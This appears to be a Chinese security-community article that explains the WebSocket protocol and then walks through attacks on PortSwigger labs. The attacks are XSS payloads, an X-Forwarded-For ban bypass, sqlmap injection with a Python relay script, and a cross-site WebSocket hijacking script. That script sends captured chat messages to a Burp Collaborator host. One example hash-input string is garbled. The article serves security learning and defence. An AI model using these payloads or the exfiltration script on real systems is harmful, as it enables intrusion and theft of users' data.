# WebSocket通信安全概览 - 先知社区
文章前言
----

在一次做项目的时候本来是想去点击Burpsuite的Proxy界面的HTTP History选项卡来查看HTTP历史请求记录信息并做测试的，但是在查看的时候却下意识的点击到了HTTP Proxy右侧的"WebSockets History"选项卡中，从界面的交互历史中发现网站有使用WebSocket进行通信，虽然之前有对Websocket有一些简单的了解(比如:跨越问题)，但是未对此进行深入研究，这让我产生了需要深入研究一下的想法

历史背景
----

在过去的很长一段时间，创建客户端和服务器之间双向通信的WEB应用程序(例如:即时消息和游戏应用程序)大多都是通过HTTP协议来轮询服务器以获取更新，同时将上游通知作为不同的HTTP调用进行发送，由此也导致了以下问题：

*   客户端脚本被迫维护从传出连接到传入连接的映射以跟踪消息回复
*   Wire Protocol(线协议)的开销很高，每个客户端到服务器的消息都有一个HTTP报头
*   服务器被迫为每个客户端使用许多不同的底层TCP连接：一个用于向客户端发送信息，另一个从客户端用于接受消息

WebSockets协议的面世很好的解决了以上问题，它提出了一个简单的解决方案——使用单个TCP连接来实现双向通信，并通过结合WebSocket API\[WSAPI\]为从网页到远程服务器的双向通信提供了HTTP轮询的替代方案，该项技术目前被广泛的用于各种WEB应用程序：游戏、股票行情器、具有同时编辑功能的多用户应用程序、实时公开服务器端服务的用户界面等

基本介绍
----

WebSocket协议旨在取代使用HTTP作为传输层的现有双向通信技术，以从现有基础设施(代理、过滤、身份验证)中获益，因为HTTP最初并不打算用于双向通信，所以这项技术也被视为提高效率和可靠性之间的权衡  
WebSocket协议试图在现有HTTP基础设施的上下文中解决现有双向HTTP技术的目标，因此它被设计为在HTTP端口80和443上工作并支持HTTP代理和中介，即使这意味着某些特定于当前环境的复杂性，然而该设计并没有将WebSocket限制为HTTP，未来的实现可以在专用端口上使用更简单的握手，而无需重新设计整个协议，该协议允许在受控环境中运行不受信任代码的客户端与选择和该代码进行通信的远程主机之间进行双向通信，它使用的安全模型为WEB浏览器常用的源模型(origin model)

备注：全双工是在微处理器与外围设备之间采用发送线和接受线各自独立的方法，可以使数据在两个方向上同时进行传送操作，指在发送数据的同时也能够接收数据且两者同步进行，这好像我们平时打电话一样，说话的同时也能够听到对方的声音

协议概览
----

WebSocket协议有两个部分：握手和数据传输

### 开启握手

#### 握手请求

开放握手(Opening Handshake)旨在与基于HTTP的服务器端软件和中介兼容，这样与该服务器通信的HTTP客户端和与该服务器进行通信的WebSocket客户端都可以使用单个端口，为此WebSocket客户端的握手是一个HTTP升级请求，简易实例如下：

GET /chat HTTP/1.1
Host: server.example.com
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==
Origin: http://example.com
Sec-WebSocket-Protocol: chat, superchat
Sec-WebSocket-Version: 13

GET方法的"Request-URI"用于标识WebSocket连接的端点，既允许从一个IP地址服务多个域，也允许单个服务器服务多个WebSocket端点，客户端在握手的"Host"头字段中包含主机名以便客户端和服务器都可以验证他们是否同意使用哪个主机，其他头字段用于选择WebSocket协议中的选项，在当前的版本中可用的典型选项主要包括子协议选择器(Sec-WebSocket-Protocol)、客户端支持的扩展列表(Sec-WebSocket-extensions)、Origin头字段，可以使用Sec-WebSocket-Protocol请求头字段来指示客户端可以接受哪些子协议(在WebSocket协议上分层的应用程序级协议)，而后服务器选择一个或任何一个可接受的协议并在其握手中回显该值，以指示其已选择该协议

Sec-WebSocket-Protocol: chat

Origin字段用于防止在Web浏览器中使用WebSocket API的脚本未经授权跨源使用WebSocketServer，Origin将通知服务器生成WebSocket连接请求的脚本源，如果服务器不希望接受来自此源的连接则可以选择通过发送适当的HTTP错误代码来拒绝连接，此标头字段由浏览器客户端发送，对于非浏览器客户端，如果在这些客户端的上下文中有意义则可以发送此头字段

最后服务器必须向客户机证明它收到了客户机的WebSocket握手以便服务器不接受非WebSocket连接的连接，这可以防止攻击者通过使用XMLHttpRequest\[XMLHttpRequest\]或表单提交发送精心制作的数据包来欺骗WebSocket服务器，而为了证明握手已被接收，服务器必须获取两条信息并将它们组合起来形成响应，第一条信息来自客户端握手中的Sec-WebSocket-Key头字段：

Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==

对于此标头字段，服务器必须获取值(如标头字段中所示，例如:base64编码的版本减去任何前导和尾随空格)并将其与字符串形式的全局唯一标识符(GUID)"258EAFA5-E914-47DA-95CA-C5AB0DC85B11"连接起来，这对不理解WebSocket协议的网络端点而言不太可能会使用，然后在服务器的握手中返回这种连接的SHA-1散列(160位),base64编码，具体地说，如果与上面的示例一样，其中Sec-WebSocket-Key头字段的值为"dGhlIHNhbXBsZSBub25jZQ=="，则服务器将串接字符串"258EAFA5-E914-47DA-95CA-C5AB0DC85B11"以形成字符串"dGhlIHNhbxbsZSBub25jZQ==258EAPA5-E914-73A-95CA-C5ABODC85B111"，然后服务器将获取此的SHA-1哈希并给出值0xb3 0x7a 0x4f 0x2c 0xc0 0x62 0x4f 0x16 0x90 0xf6 0x46 0x06 0xcf 0x38 0x59 0x45 0xb2 0xbe 0xc4 0xea，然后对该值进行base64编码，给出值"s3pPLMBiTxaQ9kYGzzhZRbK+xOo="，然后该值将在Sec-WebSocket-Accept标头字段中回显

#### 握手响应

来自服务器的握手其第一行是HTTP状态行，状态代码为101，如果服务器返回除101之外的任何状态代码则都表明WebSocket握手尚未完成：

HTTP/1.1 101 Switching Protocols

响应中的Connection和Upgrade头字段完成HTTP升级，Sec-WebSocket-Accept标头字段指示服务器是否愿意接受连接，如果存在则此标头字段必须包含在Sec-WebSocket Key中发送的客户端随机数的哈希值以及预定义的GUID，任何其他值都不得解释为服务器接受连接

HTTP/1.1 101 Switching Protocols
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Accept: s3pPLMBiTxaQ9kYGzzhZRbK+xOo=

如果Sec-WebSocket-Accept值与预期值不匹配，或者缺少标头字段以及HTTP状态代码不是101，则不会建立连接，也不会发送WebSocket帧，在此版本的协议中主选项字段是Sec-WebSocket-protocol，它指示服务器选择的子协议，WebSocket客户端验证服务器是否包含WebSocket客户机握手中指定的值之一，使用多个子协议的服务器必须确保它基于客户端的握手选择一个子协议，并在握手中指定它：

Sec-WebSocket-Protocol: chat

#### 完整示例

握手请求与握手响应的简易示例如下：  
[![](https://xzfile.aliyuncs.com/media/upload/picture/20221218144642-bb57718c-7e9f-1.png)
](https://xzfile.aliyuncs.com/media/upload/picture/20221218144642-bb57718c-7e9f-1.png)

之后此时网络连接保持打开状态，并且可以用于向任一方向发送WebSocket消息

*   请求头的Connection:Upgrade标头表示进行协议切换
*   请求头的Upgrade:websocket标头标识切换协议至Websocket
*   请求头的Sec-WebSocket-Version指定WebSocket协议版本的客户端希望使用，通常是13
*   请求头的Sec-WebSocket-Key包含Base64编码的随机值，这应该在每个握手请求是随机产生的
*   响应头的Sec-WebSocket-Accept包含在提交的值的散列Sec-WebSocket-Key请求头，具有在协议规范中定义的特定的字符串串联，从而防止由于服务器配置错误或代理缓存错误而引起的误导响应

### 数据传输

#### 数据帧

WebSocket协议中数据是使用帧序列传输的，在WebSocket开启握手完成之后以及端点发送结束帧之前，客户端或服务器可以随时发送数据帧，其中帧按照基本成帧协议规范来指定，该协议定义了一种帧类型，包括操作码、有效载荷长度以及"扩展数据"和"应用数据"的指定位置，它们一起定义了"有效载荷数据"，某些位和操作码是为将来扩展协议而保留的，下图给出了具体的阐述：

[![](https://xzfile.aliyuncs.com/media/upload/picture/20221218144752-e50b05ac-7e9f-1.png)
](https://xzfile.aliyuncs.com/media/upload/picture/20221218144752-e50b05ac-7e9f-1.png)

*   FIN: 1 bit：指示这是消息中的最后一个片段，第一片段也可以是最终片段
*   RSV1, RSV2, RSV3: 每个1 bit：除非协商了定义非零值含义的扩展，否则必须为0，如果接收到一个非零值并且协商的扩展都没有定义该非零值的含义则接收端点必须完成WebSocket Connection
*   Opcode: 4 bits：定义"有效载荷数据"的操作码，如果接收到未知操作码则接收端点必须完成WebSocket Connection_，定义了以下值：
    
*   %x0表示连续帧
    
*   %x1表示文本框
*   %x2表示二进制帧
*   %x3-7保留用于其他非控制帧
*   %x8表示连接关闭
*   %x9表示ping
*   %xA表示pong
*   %xB-F保留用于其他控制帧
    
*   Mask: 1 bit：定义是否屏蔽"有效载荷数据"，如果设置为1，maskiing-key中会出现一个屏蔽键，用于解除“有效载荷数据”的屏蔽，从客户端发送到服务器的所有帧都该将此位设置为1
    
*   Payload length: 7 bits, 7+16 bits, or 7+64 bits：有效载荷数据的长度，以字节为单位：如果为0-125，则为有效载荷长度，如果为126则解释为16位无符号整数的以下2个字节为有效载荷长度，如果为127，则解释为64位无符号整数(最高有效位必须为0)的以下8个字节为有效负载长度，多字节长度量以网络字节顺序表示，在所有情况下必须使用最小字节数来编码长度，例如:124字节长字符串的长度不能编码为序列126、0、124，有效载荷长度是"扩展数据"的长度+"应用程序数据"的长度，"扩展数据"的长度可以为零，在这种情况下有效载荷长度是"应用程序数据"的长
*   Masking-key: 0 or 4 bytes：从客户端发送到服务器的所有帧都被包含在帧中的32位值屏蔽，如果掩码位设置为1，则该字段存在，如果掩码位设为0，则不存在该字段
*   Payload data: (x+y) bytes：有效载荷数据定义为与应用程序数据连接的扩展数据
*   Extension data: x bytes：除非协商了扩展，否则扩展数据为0字节，任何扩展都必须指定扩展数据的长度或如何计算该长度以及在开始握手时必须如何协商扩展使用，如果存在则扩展数据包含在总有效载荷长度中
*   Application data: y bytes：任意应用程序数据，占用任何扩展数据之后的帧的剩余部分，应用程序数据的长度等于有效载荷长度减去扩展数据长度

#### 发送数据

要通过WebSocket连接发送由/data/组成的WebSocket消息，端点必须执行以下步骤：

*   端点必须确保WebSocket连接处于打开状态，如果在任何时候WebSocket的连接状态发生变化，端点必须中止以下步骤
*   端点必须将/data/封装在WebSocket帧中，如果要发送的数据很大或者端点开始发送数据时数据不完整，则端点可以交替地将数据封装在一系列帧中
*   包含数据的第一帧的操作码(帧操作码)必须设置为适当值，以便接收方将数据解释为文本或二进制数据
*   包含数据的最后一帧的FIN位(帧FIN)必须设置为1
*   如果客户端正在发送数据，则必须定义屏蔽帧
*   如果已经为WebSocket连接协商了扩展，则可以根据这些扩展的定义应用其他考虑因素
*   已形成的帧必须通过基础网络连接传输

#### 接受数据

接收WebSocket数据时端点需要侦听基础网络连接，传入数据必须被解析为WebSocket帧，如果接收到控制帧，则必须按照定义来处理该帧，在接收到数据帧后，端点必须注意操作码(帧操作码)定义的数据的/type/，如果该帧包括未分段消息，则称已接收到具有/type/和/data/的WebSocket消息，如果该帧是分段消息的一部分，则将后续数据帧的应用程序数据连接起来形成/data/，当如FIN位(帧FIN)所示接收到最后一个片段时，表示已接收到带有/data/(包括片段的应用数据的连接)的WebSocket消息，后续数据帧必须被解释为属于新的WebSocket消息

#### 抓包分析

在这里我们使用网站([http://coolaf.com/tool/chattest)做一个简单的测试，首先我们梳理一下流程：](http://coolaf.com/tool/chattest)%E5%81%9A%E4%B8%80%E4%B8%AA%E7%AE%80%E5%8D%95%E7%9A%84%E6%B5%8B%E8%AF%95%EF%BC%8C%E9%A6%96%E5%85%88%E6%88%91%E4%BB%AC%E6%A2%B3%E7%90%86%E4%B8%80%E4%B8%8B%E6%B5%81%E7%A8%8B%EF%BC%9A)  
Step 1：客户端首先需要和服务端建立TCP连接并完成三次握手  
Step 2：客户端发起HTTP请求，升级协议为WebSocket  
Step 3：只完成一次握手后客户端和服务端即可开始双向通信  
Step 4：客户端发送关闭帧，关闭所有连接请求

A、客户端和服务器完成三次握手  
Step 1：访问网站并建立连接

[![](https://xzfile.aliyuncs.com/media/upload/picture/20221218145108-5995de88-7ea0-1.png)
](https://xzfile.aliyuncs.com/media/upload/picture/20221218145108-5995de88-7ea0-1.png)

Step 2：在WireShark中看到三次握手过程  
第一次握手：客户端发送一个TCP，标志位为 \[SYN\] Seq = 0， 代表客户端请求建立连接

[![](https://xzfile.aliyuncs.com/media/upload/picture/20221218145124-6314ed1e-7ea0-1.png)
](https://xzfile.aliyuncs.com/media/upload/picture/20221218145124-6314ed1e-7ea0-1.png)

第二次握手：服务器发回确认包，标志位为 \[SYN，ACK\] Seq=0，ACK = 1

[![](https://xzfile.aliyuncs.com/media/upload/picture/20221218145141-6d3ba2c4-7ea0-1.png)
](https://xzfile.aliyuncs.com/media/upload/picture/20221218145141-6d3ba2c4-7ea0-1.png)  
第三次握手：客户端再次发送确认包\[ACK\] Seq=1，ACK = 1

[![](https://xzfile.aliyuncs.com/media/upload/picture/20221218145203-7a839bda-7ea0-1.png)
](https://xzfile.aliyuncs.com/media/upload/picture/20221218145203-7a839bda-7ea0-1.png)

B、升级协议处理  
首先是客户端发起请求升级协议  
[![](https://xzfile.aliyuncs.com/media/upload/picture/20221218145223-868a2980-7ea0-1.png)
](https://xzfile.aliyuncs.com/media/upload/picture/20221218145223-868a2980-7ea0-1.png)

服务端同意升级协议并回复一个101的报文  
[![](https://xzfile.aliyuncs.com/media/upload/picture/20221218145240-906fc9b4-7ea0-1.png)
](https://xzfile.aliyuncs.com/media/upload/picture/20221218145240-906fc9b4-7ea0-1.png)

C、向服务器端发送数据"Al1ex"  
[![](https://xzfile.aliyuncs.com/media/upload/picture/20221218145253-98299bd0-7ea0-1.png)
](https://xzfile.aliyuncs.com/media/upload/picture/20221218145253-98299bd0-7ea0-1.png)

WireShark抓包如下：  
[![](https://xzfile.aliyuncs.com/media/upload/picture/20221218145315-a539e604-7ea0-1.png)
](https://xzfile.aliyuncs.com/media/upload/picture/20221218145315-a539e604-7ea0-1.png)  
之后服务器端返回一个消息——"Al1ex"

[![](https://xzfile.aliyuncs.com/media/upload/picture/20221218145329-adcdcc0e-7ea0-1.png)
](https://xzfile.aliyuncs.com/media/upload/picture/20221218145329-adcdcc0e-7ea0-1.png)  
通过上面的简易对比，你会发现我发给服务端的信息是被MASK了的，但是服务端发给我的信息是属于裸奔的，至于数据帧的每个字段直接对照上面的"数据帧"部分的介绍进行理解即可，这里不再去赘述~

### 关闭握手

#### 简易流程

关闭握手比开启握手要简单许多，只需要任何一个对等方发送包含指定控制序列数据的控制帧来结束握手即可，当其中一方在接收到这样的帧时另一个对等体将发送一个关闭帧作为响应，如果它还没有发送一个，则在接收到\_that\_控制帧后，第一个对等体将关闭连接，这在知道没有更多数据即将到来的情况下是相对安全的  
在发送指示应该关闭连接的控制帧之后，对等体不发送任何进一步的数据，在接收到指示应该关闭连接的控制帧之后，对等体丢弃接收到的任何进一步的数据且不再做任何处理，同时两个对等方同时发起此握手也是安全的，关闭握手旨在补充TCP关闭握手(FIN/ACK)，因为TCP关闭握手并不总是端到端可靠的，特别是在存在拦截代理和其他中介的情况下，通过发送Close帧并等待响应的Close帧，避免了数据可能不必要丢失的某些情况，例如：在某些平台上，如果套接字被接收队列中的数据关闭，则会发送RST数据包，这将导致接收RST的一方的recv()失败，即使有数据等待读取

#### 演示实例

我们接着上面的演示示例点击"断开"使得已经建立的WebSocket连接直接断开

[![](https://xzfile.aliyuncs.com/media/upload/picture/20221218145400-c018de44-7ea0-1.png)
](https://xzfile.aliyuncs.com/media/upload/picture/20221218145400-c018de44-7ea0-1.png)  
WireShark抓包如下：  
客户端发送断开链接请求(这里的Opcode 8标识此帧为关闭帧)

[![](https://xzfile.aliyuncs.com/media/upload/picture/20221218145414-c8a67c42-7ea0-1.png)
](https://xzfile.aliyuncs.com/media/upload/picture/20221218145414-c8a67c42-7ea0-1.png)

服务器端收到关闭帧并断开链接  
[![](https://xzfile.aliyuncs.com/media/upload/picture/20221218145454-e0806d82-7ea0-1.png)
](https://xzfile.aliyuncs.com/media/upload/picture/20221218145454-e0806d82-7ea0-1.png)

安全风险
----

WebSocket作为一种通信协议其主要的功能其实还是实现通信并完成客户端与服务器端的数据的交互，而且在此过程中自然而然少不了会牵扯到相关的业务功能，也就自然会存在可以被攻击者实施攻击的脆弱点，下面我们对几个WebSocket的安全风险进行简单介绍

### 操纵消息

#### 基本介绍

在对网站进行安全测试时我们可以使用Burpsuite代理拦截整个通信数据，如果我们在Burpsuite中的"Proxy"界面的"WebSockets History"选项卡中看到有交互数据或者在HTTP Proxy中发现有回显"101 Switching Protocol"则说明网站有使用到WebSocket，在进行测试时我们其实是可以通过Burpsuite对WebSocket的通信数据包进行拦截和恶意修改处理的，整个步骤大致如下：  
Step 1：在浏览器中设置Burpsuite代理  
Step 2：使用浏览器访问目标网站，经过一段时间的测试后发现网站使用了WebSocket  
Step 3：进入到"Proxy-Intrude"模块下开启拦截，之后对整个通信数据包进行拦截处理并筛选WebSocket通信数据  
Step 4：成功拦截到WebSocket通信数据后可以对请求数据参数进行Fuzzing，例如：SQL注入、XSS、SSRF等攻击手法

#### 简易实例1

这里我们通过靶场来对操纵WebSocket数据进行攻击进行一个简单的演示，这里我们使用到的攻击类型为XSS攻击，它主要是指攻击者通过利用研发人员对用户的输入未做过滤或过滤不严以及输出未做编码的场景构造恶意代码并将其成功插入网页或后端数据库，在用户访问页面时来触发恶意载荷的执行并实现窃取用户个人信息、进行蠕虫传播的一种常见的攻击手法，目前比较常见的攻击方式主要分为存储型XSS、DOM型XSS、反射性XSS，而我们WebSocket中最为常见的应该属于反射性XSS  
实验环境：[https://portswigger.net/web-security/websockets/lab-manipulating-messages-to-exploit-vulnerabilities](https://portswigger.net/web-security/websockets/lab-manipulating-messages-to-exploit-vulnerabilities)  
实验目的：使用WebSocket消息来触发一个alert()，支持代理浏览器中的弹出窗口  
实验步骤：  
Step 1：打开靶场环境之后点击Live Chat  
[![](https://xzfile.aliyuncs.com/media/upload/picture/20221218145554-0478289c-7ea1-1.png)
](https://xzfile.aliyuncs.com/media/upload/picture/20221218145554-0478289c-7ea1-1.png)

[![](https://xzfile.aliyuncs.com/media/upload/picture/20221218145609-0d6a52b8-7ea1-1.png)
](https://xzfile.aliyuncs.com/media/upload/picture/20221218145609-0d6a52b8-7ea1-1.png)  
Step 2：抓包发送一条数据，并在WebSockets History中查看数据，修改包构造成XSS的POC

<img src=x onerror=alert(Al1ex);>

[![](https://xzfile.aliyuncs.com/media/upload/picture/20221218145631-1a9db2b8-7ea1-1.png)
](https://xzfile.aliyuncs.com/media/upload/picture/20221218145631-1a9db2b8-7ea1-1.png)  
[![](https://xzfile.aliyuncs.com/media/upload/picture/20221218145643-21867e5c-7ea1-1.png)
](https://xzfile.aliyuncs.com/media/upload/picture/20221218145643-21867e5c-7ea1-1.png)

#### 简易实例2

在学习WebSocket安全攻击手法的同时看到windcctv师傅介绍的一个关于WebSocket通过篡改数据包达到SQL注入漏洞利用的案例，由于网站已然无法访问，故而这边简单梳理一下其流程，首先是在信息收集期间发现目标站点实例WebSocket

[![](https://xzfile.aliyuncs.com/media/upload/picture/20221218145705-2e93e562-7ea1-1.png)
](https://xzfile.aliyuncs.com/media/upload/picture/20221218145705-2e93e562-7ea1-1.png)  
通过对参数进行反复的修改和测试最终发现参数params存在注入  
[![](https://xzfile.aliyuncs.com/media/upload/picture/20221218145721-384ca31e-7ea1-1.png)
](https://xzfile.aliyuncs.com/media/upload/picture/20221218145721-384ca31e-7ea1-1.png)  
之后直接使用sqlmap：

sqlmap --url "ws://10.10.10.232/ws/" --data='{"params":"help","token":"a5e6c5aade60a2c4619893218280a45d2a142e3bcf583c8e1955c0b579f13009"}' -v 3 --dbs

[![](https://xzfile.aliyuncs.com/media/upload/picture/20221218145746-472b0e52-7ea1-1.png)
](https://xzfile.aliyuncs.com/media/upload/picture/20221218145746-472b0e52-7ea1-1.png)  
payload如下所示：  
[![](https://xzfile.aliyuncs.com/media/upload/picture/20221218145801-4fb60658-7ea1-1.png)
](https://xzfile.aliyuncs.com/media/upload/picture/20221218145801-4fb60658-7ea1-1.png)  
[![](https://xzfile.aliyuncs.com/media/upload/picture/20221218145811-560f5e32-7ea1-1.png)
](https://xzfile.aliyuncs.com/media/upload/picture/20221218145811-560f5e32-7ea1-1.png)  
经过多次尝试都没有成功，之后通过中转脚本的方式成功实现了注入：

from websocket import create_connection
import re
from http.server import BaseHTTPRequestHandler, HTTPServer
from urllib.parse import unquote
import threading
from socketserver import ThreadingMixIn

hostname = "localhost"
serverport = 9000

def xt(msg):
    matches = re.findall(r'token":"(.*?)"', msg)
    return matches\[0\]

def send_msg(msg):
    resp = ""
    ws = create_connection("ws://gym.crossfit.htb/ws")
    resp =  ws.recv()
    cur_token = xt(resp)
    msg = unquote(msg)
    msg = msg.replace('"', "'")
    d = '{"message":"available","params":"'+msg+'","token":"' + cur_token + '"}'
    print(d)
    ws.send(d)
    resp = ws.recv()
    #print(resp)
    matches = re.findall(r'message":"(.*?)"', resp)
    print(matches\[0\])
    return matches\[0\]

#send_msg("1 and 2=2-- -")
#send_msg("1 and 'a'='a'-- -")
#exit(0)

class Handler(BaseHTTPRequestHandler):

    def do_GET(self):
        self.send_response(200)
        param = self.path\[5:\]
        self.send_header('Content-Type', 'text')
        self.end_headers()
        resp = send_msg(param)
        self.wfile.write(bytes(resp, "utf-8"))

class ThreadingSimpleServer(ThreadingMixIn, HTTPServer):
    pass

def run():
    server = ThreadingSimpleServer(('0.0.0.0', 9000), Handler)

    try:
        server.serve_forever()
    except KeyboardInterrupt:
        pass

if \_\_name\_\_ == '\_\_main\_\_':
    run()

运行结果如下：  
[![](https://xzfile.aliyuncs.com/media/upload/picture/20221218145927-835e8aac-7ea1-1.png)
](https://xzfile.aliyuncs.com/media/upload/picture/20221218145927-835e8aac-7ea1-1.png)  
[![](https://xzfile.aliyuncs.com/media/upload/picture/20221218145940-8b15b9dc-7ea1-1.png)
](https://xzfile.aliyuncs.com/media/upload/picture/20221218145940-8b15b9dc-7ea1-1.png)

#### 防御措施

后段服务器对传递过来的所有数据进行过滤检查，一律秉持不信任的原则进行检查

### 握手过程

#### 基本介绍

部分WebSocket漏洞只能通过操纵WebSocket握手来发现和利用，这些漏洞往往涉及设计缺陷，例如:  
应用程序使用的自定义HTTP头引入的攻击面  
在HTTP标头中放错位置的信任以执行安全性决策，例如：X-Forwarded-For标头  
会话处理机制存在缺陷，因为处理WebSocket消息的会话上下文通常由握手消息的会话上下文确定

#### 简易实例

实验环境：[https://portswigger.net/web-security/websockets/lab-manipulating-handshake-to-exploit-vulnerabilities](https://portswigger.net/web-security/websockets/lab-manipulating-handshake-to-exploit-vulnerabilities)  
实验目的：使用WebSocket消息来触发一个alert()，支持代理浏览器中的弹出窗口

#### 实验步骤

Step 1：打开靶场环境之后点击Live Chat  
[![](https://xzfile.aliyuncs.com/media/upload/picture/20221218150040-aeceb888-7ea1-1.png)
](https://xzfile.aliyuncs.com/media/upload/picture/20221218150040-aeceb888-7ea1-1.png)  
[![](https://xzfile.aliyuncs.com/media/upload/picture/20221218150053-b6762b52-7ea1-1.png)
](https://xzfile.aliyuncs.com/media/upload/picture/20221218150053-b6762b52-7ea1-1.png)

Step 2：与上面的XSS一致提交payload进行测试

<img src=x onerror=alert('Al1ex');>

[![](https://xzfile.aliyuncs.com/media/upload/picture/20221218150121-c777ce9c-7ea1-1.png)
](https://xzfile.aliyuncs.com/media/upload/picture/20221218150121-c777ce9c-7ea1-1.png)

之后可以看到攻击已被阻止，重新加载页面时发现连接尝试失败，因为IP地址已被禁止  
[![](https://xzfile.aliyuncs.com/media/upload/picture/20221218150137-d0bba15e-7ea1-1.png)
](https://xzfile.aliyuncs.com/media/upload/picture/20221218150137-d0bba15e-7ea1-1.png)  
Step 2：重新抓取请求包并提添加X-Forwarded-For请求头

X-Forwarded-For:127.0.0.1

[![](https://xzfile.aliyuncs.com/media/upload/picture/20221218150201-df31ce8e-7ea1-1.png)
](https://xzfile.aliyuncs.com/media/upload/picture/20221218150201-df31ce8e-7ea1-1.png)  
之后再次回到页面：  
[![](https://xzfile.aliyuncs.com/media/upload/picture/20221218150216-e8232074-7ea1-1.png)
](https://xzfile.aliyuncs.com/media/upload/picture/20221218150216-e8232074-7ea1-1.png)

Step 3：之后再次尝试有效的XSS载荷

<img src=x oNeRror=alert`Al1ex`;>

[![](https://xzfile.aliyuncs.com/media/upload/picture/20221218150239-f56ce8e6-7ea1-1.png)
](https://xzfile.aliyuncs.com/media/upload/picture/20221218150239-f56ce8e6-7ea1-1.png)  
Step 4：之后成功触发恶意载荷

[![](https://xzfile.aliyuncs.com/media/upload/picture/20221218150256-ffdb018c-7ea1-1.png)
](https://xzfile.aliyuncs.com/media/upload/picture/20221218150256-ffdb018c-7ea1-1.png)

#### 防御措施

对于请求头中的各类数据(例如:X-Forwarded-For)一律秉持不信任原则(除去部分WebSocket建立连接时的必要请求头外)且不将请求头中的数据存储至数据库

### CSWSH

#### 基本介绍

Cross-Site WebSocket Hijacking也就是跨域WebSocket劫持攻击，它是基于WebSocket的握手过程进行的CSRF攻击，而造成这种攻击的根本原因在于WebSocket协议在握手阶段是基于HTTP的，它在握手期间没有规定服务器如何验证客户端的身份，因此服务器需要采用HTTP客户端认证机制来辨明身份，比如:常见的Cookie、http头基本认证等，这就导致了容易被攻击者利用恶意网页伪装用户的身份与服务器建立WebSocket连接，CSWSH与跨站请求伪造CSRF的漏洞原理极其类似，相较于CSRF漏洞只能发送伪造请求，跨站WebSocket劫持漏洞却可以建立了一个完整的读/写双向通道且不受同源策略的限制，这在很大意义上都造成了更大的危害和可操作性，通过跨站点WebSocket劫持我们可以进行如下攻击：

*   越权攻击：熟知的访问控制，垂直越权与水平越权
*   信息泄露：因为WebSocket的通信是全双工通信的，所以用户与服务器之间交互的信息有可能被攻击者监听，这种监听是无声的监听，被攻击者不知道自己处于被监听状态，从而造成信息泄露

#### 利用关键

CSWSH漏洞利用的关键点是服务端没有对Origin头部进行校验导致成功握手并切换到WebSocket协议，恶意网页之后就可以成功绕过身份认证连接到WebSocket服务器，进而窃取到服务器端发来的信息或者发送伪造信息到服务器端篡改服务器端数据

#### 简易测试

Step 1：修改origin后进行握手尝试  
[![](https://xzfile.aliyuncs.com/media/upload/picture/20221218150442-3f1258a0-7ea2-1.png)
](https://xzfile.aliyuncs.com/media/upload/picture/20221218150442-3f1258a0-7ea2-1.png)

Step 2：握手成功  
[![](https://xzfile.aliyuncs.com/media/upload/picture/20221218153202-10a6f92c-7ea6-1.png)
](https://xzfile.aliyuncs.com/media/upload/picture/20221218153202-10a6f92c-7ea6-1.png)

Step 3：用第三方连接websockets发送消息发现能够抓包，如果用户已经登录网站后被诱骗访问攻击者设计好的恶意网页，恶意网页在某元素中植入一个WebSocket 握手请求申请跟网站建立WebSocket连接，一旦打开该恶意网页则自动发起攻击者构造的请求  
[http://www.websocket-test.com/](http://www.websocket-test.com/)

[![](https://xzfile.aliyuncs.com/media/upload/picture/20221218153239-26834746-7ea6-1.png)
](https://xzfile.aliyuncs.com/media/upload/picture/20221218153239-26834746-7ea6-1.png)

#### 实验环境

[https://portswigger.net/web-security/websockets/cross-site-websocket-hijacking/lab](https://portswigger.net/web-security/websockets/cross-site-websocket-hijacking/lab)

#### 实验步骤

Step 1：打开靶场环境之后点击Live Chat  
[![](https://xzfile.aliyuncs.com/media/upload/picture/20221218153307-371529a8-7ea6-1.png)
](https://xzfile.aliyuncs.com/media/upload/picture/20221218153307-371529a8-7ea6-1.png)

[![](https://xzfile.aliyuncs.com/media/upload/picture/20221218153320-3ef84bc8-7ea6-1.png)
](https://xzfile.aliyuncs.com/media/upload/picture/20221218153320-3ef84bc8-7ea6-1.png)

Step 2：之后提交message  
[![](https://xzfile.aliyuncs.com/media/upload/picture/20221218153335-47f6a1de-7ea6-1.png)
](https://xzfile.aliyuncs.com/media/upload/picture/20221218153335-47f6a1de-7ea6-1.png)  
[![](https://xzfile.aliyuncs.com/media/upload/picture/20221218153347-4effacd2-7ea6-1.png)
](https://xzfile.aliyuncs.com/media/upload/picture/20221218153347-4effacd2-7ea6-1.png)  
Step 3：在Burp Proxy的WebSockets history选项卡中，观察到"READY"命令从服务器检索过去的聊天消息  
[![](https://xzfile.aliyuncs.com/media/upload/picture/20221218153401-57777930-7ea6-1.png)
](https://xzfile.aliyuncs.com/media/upload/picture/20221218153401-57777930-7ea6-1.png)  
Step 4：在Burp Proxy的HTTP history选项卡中，找到WebSocket握手请求可以看到该请求没有CSRF令牌  
[![](https://xzfile.aliyuncs.com/media/upload/picture/20221218153511-80e7439a-7ea6-1.png)
](https://xzfile.aliyuncs.com/media/upload/picture/20221218153511-80e7439a-7ea6-1.png)

Step 5：右键单击握手请求并选择"复制URL"

[![](https://xzfile.aliyuncs.com/media/upload/picture/20221218153527-8a6d491e-7ea6-1.png)
](https://xzfile.aliyuncs.com/media/upload/picture/20221218153527-8a6d491e-7ea6-1.png)  
Step 6：在浏览器中转到exploit server，将以下模板粘贴到"Body"部分，将your-websocket-url替换为websocket握手中的URL(your-lab-id.web-security-academy. net/chat)，确保将协议从[https://更改为wss://，之后使用Burp](https://xn--wss-c88d846h6fc//%EF%BC%8C%E4%B9%8B%E5%90%8E%E4%BD%BF%E7%94%A8Burp) Collaborator客户端生成的有效负载替换your-collaborator-url

<script>
    var ws = new WebSocket('wss://your-websocket-url');
    ws.onopen = function() {
        ws.send("READY");
    };
    ws.onmessage = function(event) {
        fetch('https://your-collaborator-url', {method: 'POST', mode: 'no-cors', body: event.data});
    };
</script>

改完之后的实例如下：

<script>
    var ws = new WebSocket('wss://0acc007403ed9d97c0fd3a8f0030001d.web-security-academy.net/chat');
    ws.onopen = function() {
        ws.send("READY");
    };
    ws.onmessage = function(event) {
        fetch('https://hyjxe1dr72cujeksvi5dn54wtnzen3.burpcollaborator.net', {method: 'POST', mode: 'no-cors', body: event.data});
    };
</script>

[![](https://xzfile.aliyuncs.com/media/upload/picture/20221218153607-a24023f4-7ea6-1.png)
](https://xzfile.aliyuncs.com/media/upload/picture/20221218153607-a24023f4-7ea6-1.png)

